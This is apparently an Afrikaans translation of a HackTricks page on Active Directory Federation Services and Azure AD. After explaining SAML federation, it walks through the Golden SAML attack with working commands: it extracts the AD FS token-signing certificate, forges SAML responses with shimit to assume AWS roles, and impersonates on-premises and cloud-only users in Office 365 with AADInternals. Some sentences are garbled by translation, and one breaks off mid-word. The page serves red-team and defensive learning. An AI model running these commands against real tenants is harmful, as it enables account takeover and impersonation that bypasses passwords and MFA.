# Federasie

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-opslagplekke.

</details>

## Basiese Inligting

[Volgens die dokumentasie:](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/whatis-fed)**Federasie** is 'n versameling van **domeine** wat **vertroue** gevestig het. Die vlak van vertroue kan wissel, maar sluit gewoonlik **outentifikasie** in en altyd **magtiging**. 'n Tipiese federasie kan 'n **aantal organisasies** insluit wat **vertroue** gevestig het vir **gedeelde toegang** tot 'n stel hulpbronne.

Jy kan jou **on-premises** omgewing **federeer met Azure AD** en hierdie federasie gebruik vir outentifikasie en magtiging. Hierdie aanmeldmetode verseker dat alle gebruikers se **outentifikasie plaasvind op die terrein**. Hierdie metode stel administrateurs in staat om strenger vlakke van toegangsbeheer te implementeer. Federasie met **AD FS** en PingFederate is beskikbaar.

<figure><img src="../../../../.gitbook/assets/image (83) (1).png" alt=""><figcaption></figcaption></figure>

In Wesens, in Federasie, vind alle **outentifikasie** plaas in die **on-prem**-omgewing en die gebruiker ervaar SSO oor al die vertroude omgewings. Gebruikers kan dus **toegang verkry tot** **wolktoepassings** deur hul **on-prem-gedragsbepalings** te gebruik.

**Security Assertion Markup Language (SAML)** word gebruik om **alle outentifikasie- en magtigingsinligting** tussen die verskaffers uit te ruil.

In enige federasie-opstelling is daar drie partye:

* Gebruiker of Kli√´nt
* Identiteitsverskaffer (IdP)
* Diensverskaffer (SP)

(Afbeeldings van https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

<figure><img src="../../../../.gitbook/assets/image (1) (5).png" alt=""><figcaption></figcaption></figure>

1. Aanvanklik word 'n toepassing (Diensverskaffer of SP, soos AWS-konsole of vSphere-webkli√´nt) deur 'n gebruiker benader. Hierdie stap kan omseil word, wat die kli√´nt direk na die IdP (Identiteitsverskaffer) lei, afhangende van die spesifieke implementering.
2. Daarna identifiseer die SP die toepaslike IdP (bv. AD FS, Okta) vir gebruikersoutentifikasie. Dit stel dan 'n SAML (Security Assertion Markup Language) AuthnRequest saam en stuur die kli√´nt na die gekose IdP.
3. Die IdP neem oor en outentifiseer die gebruiker. Na outentifikasie word 'n SAMLResponse deur die IdP geformuleer en deur die gebruiker na die SP gestuur.
4. Uiteindelik evalueer die SP die SAMLResponse. As dit suksesvol gevalideer word, wat 'n vertrouensverhouding met die IdP impliseer, word die gebruiker toegang verleen. Dit dui die voltooiing van die aanmeldproses aan, wat die gebruiker in staat stel om van die diens gebruik te maak.

**As jy meer wil leer oor SAML-outentifikasie en algemene aanvalle, gaan na:**

{% embed url="https://book.hacktricks.xyz/pentesting-web/saml-attacks" %}

## Pivoting

* AD FS is 'n beweringsgebaseerde identiteitsmodel.
* "..bewerings is eenvoudig verklarings (byvoorbeeld naam, identiteit, groep) wat oor gebruikers gemaak word en hoofsaaklik gebruik word vir die magtiging van toegang tot beweringsgebaseerde toepassings oral op die internet."
* Bewerings vir 'n gebruiker word binne die SAML-token geskryf en word dan onderteken om vertroulikheid deur die IdP te bied.
* 'n Gebruiker word ge√Ødentifiseer deur ImmutableID. Dit is w√™reldwyd uniek en word in Azure AD gestoor.
* Die ImmutableID word op die terrein gestoor as ms-DS-ConsistencyGuid vir die gebruiker en/of kan afgelei word uit die GUID van die gebruiker.
* Meer inligting in [https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims](https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims)

**Golden SAML-aanval:**

* In ADFS word die SAML Response onderteken deur 'n token-ondertekeningsertifikaat.
* As die sertifikaat gekompromitteer is, is dit moontlik om as ENIGE gebruiker wat gesinkroniseer is met Azure AD, by die Azure AD aan te meld!
* Net soos ons PTA-misbruik, sal 'n wagwoordverandering vir 'n gebruiker of MFA geen effek h√™ nie omdat ons die outentifikasierespons vervals.
* Die sertifikaat kan uit die AD FS-bediener met DA-voorregte onttrek word en kan dan vanaf enige internetgekoppelde masjien gebruik word.
* Meer inligting in [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

### Golden SAML

Die proses waar 'n **Identiteitsverskaffer (IdP)** 'n **SAMLResponse** produseer om gebruikersaanmelding te magtig, is van uiterste belang. Afhangende van die spesifieke implementering van die IdP, kan die **respons** **onderteken** of **gekripteer** wees met behulp van die **IdP se privaatsleutel**. Hierdie prosedure stel die **Diensverskaffer (SP)** in staat om die egtheid van die SAMLResponse te bevestig, wat verseker dat dit inderdaad deur 'n vertroude IdP uitgereik is.

'n Parallel kan getrek word met die [golden ticket-aanval](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket), waar die sleutel wat die gebruiker se identiteit en toestemmings (KRBTGT vir golden tickets, privaatsleutel vir token-ondertekening vir golden SAML) outentifiseer, g
```powershell
# From an "AD FS" session
# After having exported the key with mimikatz

# ADFS Public Certificate
[System.Convert]::ToBase64String($cer.rawdata)

# IdP Name
(Get-ADFSProperties).Identifier.AbsoluteUri

# Role Name
(Get-ADFSRelyingPartyTrust).IssuanceTransformRule
```
Met al die inligting is dit moontlik om 'n geldige SAMLResponse te vergeet as die gebruiker wat jy wil voorstel met behulp van [**shimit**](https://github.com/cyberark/shimit)**:** 

{% code overflow="wrap" %}
```bash
# Apply session for AWS cli
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012
# idp - Identity Provider URL e.g. http://server.domain.com/adfs/services/trust
# pk - Private key file full path (pem format)
# c - Certificate file full path (pem format)
# u - User and domain name e.g. domain\username (use \ or quotes in *nix)
# n - Session name in AWS
# r - Desired roles in AWS. Supports Multiple roles, the first one specified will be assumed.
# id - AWS account id e.g. 123456789012

# Save SAMLResponse to file
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012 -o saml_response.xml
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

### Op-prem -> wolk
```powershell
# With a domain user you can get the ImmutableID of the target user
[System.Convert]::ToBase64String((Get-ADUser -Identity <username> | select -ExpandProperty ObjectGUID).tobytearray())

# On AD FS server execute as administrator
Get-AdfsProperties | select identifier

# When setting up the AD FS using Azure AD Connect, there is a difference between IssueURI on ADFS server and Azure AD.
# You need to use the one from AzureAD.
# Therefore, check the IssuerURI from Azure AD too (Use MSOL module and need GA privs)
Get-MsolDomainFederationSettings -DomainName deffin.com | select IssuerUri

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate a user to to access cloud apps
Open-AADIntOffice365Portal -ImmutableID v1pOC7Pz8kaT6JWtThJKRQ== -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Documents\ADFSSigningCertificate.pfx -Verbose
```
Dit is ook moontlik om 'n ImmutableID van slegs wolkgebruikers te skep en hulle te impersoneer.
```powershell
# Create a realistic ImmutableID and set it for a cloud only user
[System.Convert]::ToBase64String((New-Guid).tobytearray())
Set-AADIntAzureADObject -CloudAnchor "User_19e466c5-d938-1293-5967-c39488bca87e" -SourceAnchor "aodilmsic30fugCUgHxsnK=="

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate the user
Open-AADIntOffice365Portal -ImmutableID "aodilmsic30fugCUgHxsnK==" -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Desktop\ADFSSigningCertificate.pfx -Verbose
```
## Verwysings

* [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed)
* [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>
